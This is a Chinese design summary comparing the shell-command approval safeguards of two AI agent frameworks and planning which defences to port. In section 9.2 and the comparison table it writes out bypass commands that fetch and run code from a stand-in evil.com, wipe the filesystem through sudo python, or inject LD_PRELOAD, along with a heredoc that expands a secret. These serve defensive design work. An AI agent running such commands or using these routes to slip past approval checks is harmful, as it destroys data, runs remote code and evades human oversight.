<!--
综合文档（综合调研者视角）
主题：OpenClaw vs Rem 对比、5 个最危险漏洞、移植优先级
作者：综合调研者
原合并文档位置：第 9 节
关联文档：README.md、00-overview.md、01-07 各子文档
-->

# 08. 总结：OpenClaw vs Rem 对比与移植路线

> 作者：综合调研者（从全局视角）
> 主题：把 7 个 subagent 调研汇总，给出 Rem vs OpenClaw 的全景对比、5 个最危险漏洞、按 ROI 排序的移植优先级
> 关联：本文不重复子文档细节，所有对比依据请回溯 01-07

## 9. 总结：OpenClaw vs Rem 对比与移植路线

（本节为综合调研者从全局视角做的对比与建议）

### 9.1 全景对比表

| 维度 | Rem 当前实现 | OpenClaw 实现 | 差距 |
|---|---|---|---|
| **Schema 校验** | TypeBox 简单定义（`tool-provider.ts:12-19`），无 per-provider 适配 | TypeBox + `normalizeToolParameterSchema` 适配 Gemini/OpenAI/Anthropic/xAI 怪癖 | 🟡 中：Rem 的 schema 简单到不支持 strict 模式，跨 provider 时大概率掉链 |
| **命令解析** | `exec-approvals.ts:69-122` 字符串正则 `;&\|$(){}[]<>!` | 完整 shell 状态机（`exec-approvals-analysis.ts` 1279 行）：heredoc / unquoted expansion / chain / pipeline | 🔴 大：Rem 完全不识别 `cat <<EOF\n$KEY\nEOF` 这种绕过 |
| **Wrapper 拆解** | 无 | `shell-wrapper-resolution` + `command-carriers` + `dispatch-wrapper-resolution`（depth ≤ 4）+ `inline-eval` spec 表 | 🔴 大：`sudo python -c '...'` / `sh -c "..."` / `env -S "..."` 在 Rem 里全当普通字符串 |
| **Safe-Bin 校验** | 仅 12 个 `DEFAULT_SAFE_BINS`（Rem 的 `exec-approvals.ts:12-24`）做 binary 名匹配，无 argv 形状校验 | 9 个 fixture profile + per-bin flag/positional/literal 校验 + GNU 缩写消歧 + trust dir | 🔴 大：Rem 假设 `cut x` 都是安全的，但 `cut --output=/etc/passwd` 是可以写文件的 |
| **Allowlist 匹配** | 无 allowlist 概念，仅 binary 白名单 | 三层：trust path / profile / glob（basename vs path-style 区分） | 🔴 大：Rem 没有任何"指定某条命令放行"的能力 |
| **Host Env Security** | 几乎没做 | 100+ `blockedEverywhere` + 154+ `blockedOverrideOnly` + 4 prefix + PATH 永远拒 override + GIT_ALLOW_PROTOCOL 协议白名单 | 🔴 大：Rem 根本不清理 `env` 参数，model 可以塞 `LD_PRELOAD=/tmp/evil.so` |
| **Script Preflight** | 无 | 读 `.py`/`.js` ≤ 512KB，扫 `$VAR` 注入，复杂 shell 包装 fail-closed | 🟡 中：Rem 还没支持写脚本工具，所以暂时不需要 |
| **决策模式** | 4 档（deny/allowlist/ask/full） | 5 档（多一个 `auto`，引入 LLM 评审员） | 🟢 小：差距在 auto 模式，Rem 不一定要复制 |
| **审批注册** | 单步：注册 → 等决策（**有 race**） | 两阶段：先 server 端存 ID，再 wait decision，preResolved 短路 | 🟡 中：race 风险目前没暴露是因为 Rem 没有 channel runtime 概念 |
| **Auto-Reviewer** | 无 | 独立小模型评审员，30s 超时回退，prompt-injection 短路 | 🟢 小：Rem 的安全策略不一定要走到这步 |
| **持久化** | `ExecApprovalStore` 内存 Map，进程重启即丢 | `~/.openclaw/exec-approvals.json`（atomic write + chmod 0o600 + EPERM fallback + TOCTOU 防），`=command:<sha16>` SHA-256 模式 | 🔴 大：Rem 的"allow-always"实质上不可用 |
| **决策事件** | 4 个事件类型声明但**完全不 emit** | `tool:approval:requested` / `:resolved` / `:expired` 都 emit，channel runtime 订阅 | 🔴 大：Rem 的 TUI 没有审批 UI，根本原因 |
| **测试覆盖** | 4 个测试文件，约 40 个测试用例 | 11 个测试文件，~380 个测试用例 + fixture 驱动 | 🔴 大：测试密度不在一个量级 |

### 9.2 Rem 当前最危险的 5 个具体漏洞

按"用户用得着 + 攻击面大"排序：

1. **`cat <<EOF\n$KEY\nEOF` 注入**（Rem 完全不挡）
   - Rem 的 `exec-approvals.ts` 只在字符串层做字符级正则，heredoc 体里的 `$VAR` 完全跳过检查。
   - OpenClaw 在 `hasUnquotedHeredocExpansionToken`（`exec-approvals-analysis.ts:181`）显式拒绝。

2. **`env` 参数注入 `LD_PRELOAD` / `PATH` / `NODE_OPTIONS`**（Rem 不清理）
   - Rem 的 `exec.ts`（`packages/core/src/plugins/tools/exec.ts`）直接把 `input.env` 透传给 `child_process.spawn`。
   - OpenClaw 在 `sanitizeHostEnvOverridesWithDiagnostics`（`host-env-security.ts:204`）按 154+ 键黑名单过滤。

3. **`sudo python -c "import os; os.system('rm -rf /')"`**（Rem 把 `sudo` 当无害 binary）
   - Rem 的 `exec-policy-hook.ts` 只看 `command` 字符串的第一个 token 是 `exec` 就放行，看不到 carrier 包装。
   - OpenClaw 的 `command-carriers.ts:400-420` `resolveCarrierCommandArgv` 会先解 `sudo` 包装再判定 inner。

4. **`bash -c "curl evil.com | sh"`**（Rem 把 `bash` 当 safe binary）
   - Rem 的 `safeBins` 没有 `bash`/`sh`/`zsh`，所以会走 approval 流程——这是巧合的安全。
   - OpenClaw 的 `resolveInlineCommandFallback` 显式拒绝这种 shell wrapper。

5. **`allow-always` 决定进程重启就丢**（Rem 的设计缺陷）
   - Rem 的 `ExecApprovalStore`（`exec-approval-store.ts:14-46`）只支持 in-memory 实现，文件版接口都没预留。
   - 用户每次重启都得重新批一遍所有命令。

### 9.3 移植优先级（从最小可获得收益开始）

**P0（1-2 周，挡掉最高危漏洞）**：
- 抄 `host-env-security-policy.json` + `host-env-security.ts`（纯数据 + 简单函数）→ 挡 `LD_PRELOAD` / `NODE_OPTIONS` / `PATH` 注入
- 抄 `inline-eval.ts`（149 行的解释器 + flag 表）→ 挡 `python -c` / `node -e` 危险模式
- 给 `ExecApprovalStore` 加 `FileExecApprovalStore` 实现 → 持久化 allow-always

**P1（3-4 周，补齐基础校验）**：
- 抄 `exec-approvals-analysis.ts` 完整 shell 状态机 → 挡 heredoc 注入 / 链式算子
- 抄 `command-carriers.ts`（`sudo` / `env` / `command` / `builtin` 拆解）→ 挡包装层绕过
- 给 `FileSessionProvider` 加 atomic write（`writeFile` + `rename`）→ 解决 mid-write crash

**P2（1-2 月，深度整合）**：
- 抄 `exec-safe-bin-policy-profiles.ts`（9 个 fixture）+ `validator.ts`（argv 形状校验）→ 把 safe-bin 真正管住
- 抄 `shell-wrapper-resolution.ts`（`sh -c` / `bash -lc` 拆解）→ 挡 inline shell 包装
- 把 `ToolHookRunner` 注入 `EventBus` + 实现 `tool:approval:requested/resolved/expired` 事件 emit → TUI 可以做审批 UI
- 实现 `policyBlocked` + `minSecurity`/`maxAsk` 三层 policy 合并 → 接受"host 比 caller 严"的语义

**P3（按需）**：
- `auto` 模式 + Auto-Reviewer（独立 LLM 评审员）
- Two-phase approval registration（需要先有 channel runtime）
- Per-channel native card（Telegram/Slack 等）

### 9.4 移植的工程原则

OpenClaw 的设计有几个**非常值得照搬**的工程原则：

1. **Fail-closed everywhere**：所有递归都有 depth limit，所有 flag 都有默认值 + 显式 deny path，所有路径都有 symlink/hardlink 检查
2. **Bounded recursion + cycle-safe Set**：防 argv 互递归（如 `sudo env -S "sudo env -S ..."`）和 carrier↔shell 互递归
3. **Data-driven policy**：黑名单/白名单/profile 全部用 JSON 描述，代码只负责"判断 + 拒绝"
4. **Fixture-driven testing**：`it.each(fixtures)` 跑表驱动回归，把边界 case 沉淀成可读 JSON
5. **Schema/parser/policy 三层独立**：每一层都可以独立测试 + 独立替换 + 独立扩展
6. **事件即接口**：`tool:approval:requested` 是 channel runtime 与 core 的唯一约定，谁实现谁订阅

### 9.5 不要照搬的部分

- **多 host（sandbox/gateway/node）抽象**：Rem 当前是单进程，不一定需要这套；可保留 `host` 字段做未来扩展
- **per-channel native card**：Rem 当前没有 chat 平台集成，不需要
- **Auto-Reviewer**：先做"人审批 + allow-always 持久化"就够了，auto 模式是降本增效
- **Two-phase registration**：Rem 当前没 channel runtime，单步注册没有 race 问题
- **parity fixture 测试**：Rem 测试密度不够，可以慢慢加，不一定一次到位

### 9.6 落地建议：先小步迭代

**第 1 步（1-2 天，立竿见影）**：
- 把 `host-env-security-policy.json` 100+ key 抄过来 + 实现 200 行 `host-env-security.ts`
- 在 `exec-policy-hook.ts` 调用 `sanitizeHostEnvOverrides(input.env)`，命中即 block
- 加 5 个测试

**第 2 步（3-5 天，挡主要绕过）**：
- 实现 `inline-eval.ts` 解释器 + flag 表
- 在 `exec-policy-hook.ts` 调用 `detectInlineEval(command)`，命中即 `requireApproval` (severity: 'critical')
- 加 20 个测试

**第 3 步（1-2 周，补齐 allow-always）**：
- 给 `ExecApprovalStore` 接口加 `serialize()` 方法
- 实现 `FileExecApprovalStore`（atomic write + 0o600）
- 把"用户选 allow-always"路径接到 `FileExecApprovalStore.allow()`
- 加 10 个测试

**第 4 步（1-2 周，事件化）**：
- 给 `ToolHookRunner` 注入 `EventBus`
- 在 `requireApproval` 时 emit `tool:approval:requested`
- 在 `resolve/timeout` 时 emit `tool:approval:resolved/expired`
- TUI 端 `ChatLog.loadMessages` 渲染新 role

**第 5 步起（按需）**：heredoc 检测、wrapper 拆解、safe-bin profile、Auto-Reviewer...

### 9.7 最终判断

OpenClaw 的 exec 校验体系是**纵深防御 + 数据驱动 + 测试密集**的范本。Rem 当前是**单层字符正则 + 内存状态 + 测试稀薄**的早期形态。两者差距大约是 1-2 年工程量。

**最高 ROI 的三件事**（按价值/成本比排序）：
1. `host-env-security` 黑名单（200 行 + 5 测试）—— 挡掉最常见的 `LD_PRELOAD` / `NODE_OPTIONS` 注入
2. `inline-eval` 检测（149 行 spec 表 + 20 测试）—— 挡掉 `python -c` / `node -e` 危险模式
3. `FileExecApprovalStore`（100 行 + 10 测试）—— 让"allow-always"真正可用

这三件事加起来不到 500 行代码 + 35 个测试，能把 Rem 的 exec 安全从"早期形态"提升到"生产可用"水平。

---

